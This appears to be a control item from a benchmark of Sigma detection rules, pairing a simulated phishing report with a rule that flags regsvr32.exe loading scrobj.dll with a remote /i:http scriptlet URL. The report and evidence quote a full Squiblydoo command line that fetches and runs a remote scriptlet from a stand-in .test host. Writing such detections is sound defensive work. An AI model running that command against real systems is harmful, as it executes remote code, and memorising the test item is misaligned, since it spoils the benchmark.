id: CTL1-03
role: control
defect_class: NONE
evasive: false
why: 'Correct rule: tags match T1218.010, every value (regsvr32.exe, scrobj.dll, /i:http) is quoted in
  the evidence, all three selections must hold, and ordinary regsvr32 DLL registration without scrobj.dll
  and a remote /i: URL does not match.'
expected_gate: none
report_text: 'The phishing document launched a scriptlet loader without writing an executable to disk.
  The activity began minutes after the user opened the attachment. Process telemetry recorded regsvr32.exe
  /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll, a technique often called Squiblydoo,
  which makes the signed regsvr32.exe fetch and run a remote scriptlet. The scrobj.dll library is the
  scriptlet runtime and there is no reason for it to appear in a regsvr32 command line in this estate.
  The /i: switch carried an http URL in every observed case. Analysts should alert when regsvr32.exe is
  started with scrobj.dll and a remote /i:http argument.'
evidence:
- regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll
- Analysts should alert when regsvr32.exe is started with scrobj.dll and a remote /i:http argument.
logsource: windows_process_creation
techniques:
- T1218.010
sigma_yaml: |
  title: Regsvr32 Remote Scriptlet Execution via Scrobj
  id: 8d2e9c30-5f64-4b8d-a113-4e906f1b3c03
  status: experimental
  description: 'Detects regsvr32.exe loading scrobj.dll with a remote scriptlet URL passed through the /i: switch.'
  references:
    - 'urn:atidep:case'
  author: case-author
  date: 2026/10/02
  tags:
    - attack.stealth
    - attack.t1218.010
  logsource:
    category: process_creation
    product: windows
  detection:
    selection_img:
      Image|endswith: '\regsvr32.exe'
    selection_scrobj:
      CommandLine|contains: 'scrobj.dll'
    selection_remote:
      CommandLine|contains: '/i:http'
    condition: all of selection*
  falsepositives:
    - 'Legacy software that registers remote scriptlets, which is not expected in this estate'
  level: high
assumptions: []
